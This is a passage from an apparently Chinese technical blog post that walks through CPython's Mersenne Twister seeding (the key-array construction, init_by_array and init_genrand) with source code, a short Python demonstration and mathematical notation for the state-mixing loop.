!defined(MS_WINDOWS_DESKTOP) &amp;&amp; !defined(MS_WINDOWS_SYSTEM)</span></span><br><span class="line">    key[<span class="number">2</span>] = (<span class="type">uint32_t</span>)GetCurrentProcessId();</span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> defined(HAVE_GETPID)</span></span><br><span class="line">    key[<span class="number">2</span>] = (<span class="type">uint32_t</span>)getpid();</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    key[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (PyTime_Monotonic(&amp;now) &lt; <span class="number">0</span>) {</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    }</span><br><span class="line">    key[<span class="number">3</span>] = (<span class="type">uint32_t</span>)(now &amp; <span class="number">0xffffffff</span>U);</span><br><span class="line">    key[<span class="number">4</span>] = (<span class="type">uint32_t</span>)(now &gt;&gt; <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">    init_by_array(self, key, Py_ARRAY_LENGTH(key));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>此过程生成四个 32 位整数，这些整数再次用于使用 <code>init_by_array</code> 函数初始化 MT PRNG 的内部状态。（生成数组较小，理想情况下只有128位熵，较差情况取决于当前时间和PID是否被成功猜测出来）</p><h3 id="直接利用数字"><a href="#直接利用数字" class="headerlink" title="直接利用数字"></a>直接利用数字</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* This algorithm relies on the number being unsigned.</span></span><br><span class="line"><span class="comment"> * So: if the arg is a PyLong, use its absolute value.</span></span><br><span class="line"><span class="comment"> * Otherwise use its hash value, cast to unsigned.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (PyLong_CheckExact(arg)) {</span><br><span class="line">    n = PyNumber_Absolute(arg);</span><br><span class="line">} <span class="keyword">else</span> <span class="keyword">if</span> (PyLong_Check(arg)) {</span><br><span class="line">    <span class="comment">/* Calling int.__abs__() prevents calling arg.__abs__(), which might</span></span><br><span class="line"><span class="comment">        return an invalid value. See issue #31478. */</span></span><br><span class="line">    _randomstate *state = _randomstate_type(Py_TYPE(self));</span><br><span class="line">    n = PyObject_CallOneArg(state-&gt;Long___abs__, arg);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span> {</span><br><span class="line">    Py_hash_t hash = PyObject_Hash(arg);</span><br><span class="line">    <span class="keyword">if</span> (hash == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">goto</span> Done;</span><br><span class="line">    n = PyLong_FromSize_t((<span class="type">size_t</span>)hash);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (n == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">goto</span> Done;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Now split n into 32-bit chunks, from the right. */</span></span><br><span class="line">bits = _PyLong_NumBits(n);</span><br><span class="line"><span class="keyword">if</span> (bits == (<span class="type">size_t</span>)<span class="number">-1</span> &amp;&amp; PyErr_Occurred())</span><br><span class="line">    <span class="keyword">goto</span> Done;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Figure out how many 32-bit chunks this gives us. */</span></span><br><span class="line">keyused = bits == <span class="number">0</span> ? <span class="number">1</span> : (bits - <span class="number">1</span>) / <span class="number">32</span> + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Convert seed to byte sequence. */</span></span><br><span class="line">key = (<span class="type">uint32_t</span> *)PyMem_Malloc((<span class="type">size_t</span>)<span class="number">4</span> * keyused);</span><br><span class="line"><span class="keyword">if</span> (key == <span class="literal">NULL</span>) {</span><br><span class="line">    PyErr_NoMemory();</span><br><span class="line">    <span class="keyword">goto</span> Done;</span><br><span class="line">}</span><br><span class="line">res = _PyLong_AsByteArray((PyLongObject *)n,</span><br><span class="line">                            (<span class="type">unsigned</span> <span class="type">char</span> *)key, keyused * <span class="number">4</span>,</span><br><span class="line">                            PY_LITTLE_ENDIAN,</span><br><span class="line">                            <span class="number">0</span>, <span class="comment">/* unsigned */</span></span><br><span class="line">                            <span class="number">1</span>); <span class="comment">/* with exceptions */</span></span><br><span class="line"><span class="keyword">if</span> (res == <span class="number">-1</span>) {</span><br><span class="line">    <span class="keyword">goto</span> Done;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">init_by_array(self, key, keyused);</span><br></pre></td></tr></table></figure><p>代码的大致逻辑是如果种子是一个正整数（无论长度多长），它会被分割为若干个32位的块以构造关键数组；如果是负整数，则使用其绝对值；如果是浮点数，则使用其<code>hash</code>值</p><p>利用原文章的例子介绍一下每段代码中出现的<code>key</code>数组的构造过程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">split_into_32bit_chunks</span>(<span class="params">n</span>):</span><br><span class="line">    chunks = []</span><br><span class="line">    <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">        chunks.append(n &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line">        n &gt;&gt;= <span class="number">32</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> chunks:</span><br><span class="line">        chunks = [<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> chunks</span><br><span class="line"></span><br><span class="line"><span class="comment"># random.seed(-0x909192939495969798)</span></span><br><span class="line">key1 = [<span class="built_in">hex</span>(chunk) <span class="keyword">for</span> chunk <span class="keyword">in</span>  split_into_32bit_chunks(<span class="built_in">abs</span>(-<span class="number">0x909192939495969798</span>))]</span><br><span class="line"><span class="built_in">print</span>(key1)</span><br><span class="line"><span class="comment"># key1 = [0x95969798, 0x91929394, 0x90]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># random.seed(0x909192939495969798)</span></span><br><span class="line">key2 = [<span class="built_in">hex</span>(chunk) <span class="keyword">for</span> chunk <span class="keyword">in</span> split_into_32bit_chunks(<span class="number">0x909192939495969798</span>)]</span><br><span class="line"><span class="built_in">print</span>(key2)</span><br><span class="line"><span class="comment"># key2 = [0x95969798, 0x91929394, 0x90]</span></span><br><span class="line"></span><br><span class="line">random.seed(<span class="built_in">hash</span>(<span class="number">871628728198271972.8621</span>))</span><br><span class="line">key3 = [chunk <span class="keyword">for</span> chunk <span class="keyword">in</span> split_into_32bit_chunks(<span class="built_in">hash</span>(<span class="number">871628728198271972.8621</span>))]</span><br><span class="line"><span class="built_in">print</span>(key3)</span><br><span class="line"><span class="comment"># key4 = [3494417408, 202941877]</span></span><br><span class="line"></span><br><span class="line">random.seed(<span class="string">"my seed"</span>)</span><br><span class="line">equivalent_seed = <span class="number">0x6d792073656564c046d02141256723ba893a44f1a54538aba62218287bc56767433568ca7548571fe1760ba924e2f8b1e9e8887814c985f3827c68fdb09e639f313ec1c83476be</span></span><br><span class="line">key4 = [chunk <span class="keyword">for</span> chunk <span class="keyword">in</span> split_into_32bit_chunks(equivalent_seed)]</span><br><span class="line"><span class="built_in">print</span>(key4)</span><br><span class="line"><span class="comment"># key = [3358881470, 2670804673, 4256210531, 4085415016, 2014628229, 2984896648, 2837766904, 534869515, 3396683863, 1732457832, 679200103, 2879791640, 4054140216, 3129555524, 1092970275, 3225866273, 1936024932, 7174432]</span></span><br></pre></td></tr></table></figure><p>之后<code>key</code>数组（即种子数组）仍然和之前一样传入 <code>init_by_array</code> 函数</p><p>现在我们已经了解了不同类型的种子是如何去构造<code>key</code>数组的，接下来介绍如何通过这个可变长数组计算mt的初始状态<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.14ex" height="1.545ex" role="img" focusable="false" viewbox="0 -683 504 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"/></g></g></g></svg></mjx-container>，我们记<code>key</code>数组为<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.76ex" height="1.545ex" role="img" focusable="false" viewbox="0 -683 778 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="4B" d="M128 622Q121 629 117 631T101 634T58 637H25V683H36Q57 680 180 680Q315 680 324 683H335V637H313Q235 637 233 620Q232 618 232 462L233 307L379 449Q425 494 479 546Q518 584 524 591T531 607V608Q531 630 503 636Q501 636 498 636T493 637H489V683H499Q517 680 630 680Q704 680 716 683H722V637H708Q633 633 589 597Q584 592 495 506T406 419T515 254T631 80Q644 60 662 54T715 46H736V0H728Q719 3 615 3Q493 3 472 0H461V46H469Q515 46 515 72Q515 78 512 84L336 351Q332 348 278 296L232 251V156Q232 62 235 58Q243 47 302 46H335V0H324Q303 3 180 3Q45 3 36 0H25V46H58Q100 47 109 49T128 61V622Z"/></g></g></g></g></svg></mjx-container>，长度为<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.179ex" height="1.595ex" role="img" focusable="false" viewbox="0 -694 521 705"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"/></g></g></g></svg></mjx-container></p><h3 id="初始状态的构建"><a href="#初始状态的构建" class="headerlink" title="初始状态的构建"></a>初始状态的构建</h3><p><code>init_by_array</code>函数如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* initialize by an array with array-length */</span></span><br><span class="line"><span class="comment">/* init_key is the array for initializing keys */</span></span><br><span class="line"><span class="comment">/* key_length is its length */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">init_by_array</span><span class="params">(RandomObject *self, <span class="type">uint32_t</span> init_key[], <span class="type">size_t</span> key_length)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">size_t</span> i, j, k, l;       <span class="comment">/* was signed in the original code. RDH 12/16/2002 */</span></span><br><span class="line">    <span class="type">uint32_t</span> *mt;</span><br><span class="line"></span><br><span class="line">    mt = self-&gt;state;</span><br><span class="line">    init_genrand(self, <span class="number">19650218U</span>);</span><br><span class="line">    i=<span class="number">1</span>; j=<span class="number">0</span>;</span><br><span class="line">    k = (N&gt;key_length ? N : key_length);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (; k; k--) {</span><br><span class="line">        mt[i] = (mt[i] ^ ((mt[i<span class="number">-1</span>] ^ (mt[i<span class="number">-1</span>] &gt;&gt; <span class="number">30</span>)) * <span class="number">1664525U</span>))</span><br><span class="line">                 + init_key[j] + (<span class="type">uint32_t</span>)j; <span class="comment">/* non linear */</span></span><br><span class="line">        i++; j++;</span><br><span class="line">        <span class="keyword">if</span> (i&gt;=N) { mt[<span class="number">0</span>] = mt[N<span class="number">-1</span>]; i=<span class="number">1</span>; }</span><br><span class="line">        <span class="keyword">if</span> (j&gt;=key_length) j=<span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (k=N<span class="number">-1</span>; k; k--) {</span><br><span class="line">        mt[i] = (mt[i] ^ ((mt[i<span class="number">-1</span>] ^ (mt[i<span class="number">-1</span>] &gt;&gt; <span class="number">30</span>)) * <span class="number">1566083941U</span>))</span><br><span class="line">                 - (<span class="type">uint32_t</span>)i; <span class="comment">/* non linear */</span></span><br><span class="line">        i++;</span><br><span class="line">        <span class="keyword">if</span> (i&gt;=N) { mt[<span class="number">0</span>] = mt[N<span class="number">-1</span>]; i=<span class="number">1</span>; }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    mt[<span class="number">0</span>] = <span class="number">0x80000000</span>U; <span class="comment">/* MSB is 1; assuring non-zero initial array */</span></span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>它用于通过用户提供的种子数组 <code>init_key[]</code> 来初始化状态数组 <code>mt</code>，从而确定随机数序列的起点，函数需要传入三个参数：</p><ul><li>指向RandomObject结构的指针</li><li>初始化使用的种子数组</li><li>种子数组的长度</li></ul><p>接下来介绍<code>init_by_array</code>函数的逻辑：</p><ul><li>通过使用默认种子19650218调用 <code>init_genrand</code> 来初始化初始状态 <code>I</code> <ul><li>对mt数组引导初始化确保状态不是全 0，全 1 等不安全状态</li></ul></li></ul><blockquote><p><code>init_genrand</code> 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* initializes mt[N] with a seed */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">init_genrand</span><span class="params">(RandomObject *self, <span class="type">uint32_t</span> s)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">int</span> mti;</span><br><span class="line"><span class="type">uint32_t</span> *mt;</span><br><span class="line"></span><br><span class="line">mt = self-&gt;state;</span><br><span class="line">mt[<span class="number">0</span>]= s;</span><br><span class="line"><span class="keyword">for</span> (mti=<span class="number">1</span>; mti&lt;N; mti++) {</span><br><span class="line">    mt[mti] =</span><br><span class="line">    (<span class="number">1812433253U</span> * (mt[mti<span class="number">-1</span>] ^ (mt[mti<span class="number">-1</span>] &gt;&gt; <span class="number">30</span>)) + mti);</span><br><span class="line">    <span class="comment">/* See Knuth TAOCP Vol2. 3rd Ed. P.106 for multiplier. */</span></span><br><span class="line">    <span class="comment">/* In the previous versions, MSBs of the seed affect   */</span></span><br><span class="line">    <span class="comment">/* only MSBs of the array mt[].                                */</span></span><br><span class="line">    <span class="comment">/* 2002/01/09 modified by Makoto Matsumoto                     */</span></span><br><span class="line">}</span><br><span class="line">self-&gt;index = mti;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>我们不去关注函数内部的具体实现，我们只记初始化完成的mt为<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="2.839ex" height="1.545ex" role="img" focusable="false" viewbox="0 -683 1255 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"/></g><g data-mml-node="mi" transform="translate(751,0)"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"/></g></g></g></svg></mjx-container></p></blockquote><ul><li>第一个循环是关键的初始化步骤，进行循环混合，将<code>mt</code>数组，<code>init_key</code>数组，当前索引等进行混合，实现非线性扩散，具体的操作很简单我们会在下面建模说明</li><li>第二个循环更改了与<code>mt</code>数组相乘的乘数，继续打乱mt状态，实现雪崩效应</li><li>最后一步将初始状态<code>mt</code>数组的第一个元素<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.375ex;" xmlns="http://www.w3.org/2000/svg" width="1.983ex" height="1.92ex" role="img" focusable="false" viewbox="0 -683 876.6 848.6"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"/></g><g data-mml-node="mn" transform="translate(473,-150) scale(0.707)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"/></g></g></g></g></svg></mjx-container>置为 <code>0x80000000</code></li></ul><p>设<code>A=1664525</code>，函数<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="4.348ex" height="2.262ex" role="img" focusable="false" viewbox="0 -750 1922 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mo" transform="translate(572,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mi" transform="translate(961,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"/></g><g data-mml-node="mo" transform="translate(1533,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g></g></g></svg></mjx-container>定义如下：</p><script type="math/tex; mode=display">u(x)=x\oplus (x\gg30)</script><p>第一个循环执行如下的操作：</p><script type="math/tex; mode=display">\begin{array}{lrl}J_{i}=\left(PI_{i} \oplus u\left(J_{i-1}\right) A\right)+K_{j}+j & \forall i \in[1,623], j \equiv i-1 & \bmod k \qquad(4)\\J_{0}=J_{623} & &  \qquad \qquad \hspace{0.4cm} (5)\\J_{1}=\left(J_{1} \oplus u\left(J_{0}\right) A\right)+K_{j}+j & j \equiv 623 & \bmod k \qquad(6)\end{array}</script><p>==注：新中间状态 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.05ex;" xmlns="http://www.w3.org/2000/svg" width="1.432ex" height="1.595ex" role="img" focusable="false" viewbox="0 -683 633 705"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43D" d="M447 625Q447 637 354 637H329Q323 642 323 645T325 664Q329 677 335 683H352Q393 681 498 681Q541 681 568 681T605 682T619 682Q633 682 633 672Q633 670 630 658Q626 642 623 640T604 637Q552 637 545 623Q541 610 483 376Q420 128 419 127Q397 64 333 21T195 -22Q137 -22 97 8T57 88Q57 130 80 152T132 174Q177 174 182 130Q182 98 164 80T123 56Q115 54 115 53T122 44Q148 15 197 15Q235 15 271 47T324 130Q328 142 387 380T447 625Z"/></g></g></g></svg></mjx-container> 要通过预初始化后的<code>mt</code>得到，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="5.783ex" height="2.262ex" role="img" focusable="false" viewbox="0 -750 2556 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"/></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g><g data-mml-node="mo" transform="translate(1278,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mn" transform="translate(1667,0)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"/></g><g data-mml-node="mo" transform="translate(2167,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g></g></g></svg></mjx-container>两式出现的原因是下面的代码==</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (; k; k--) {</span><br><span class="line">        mt[i] = 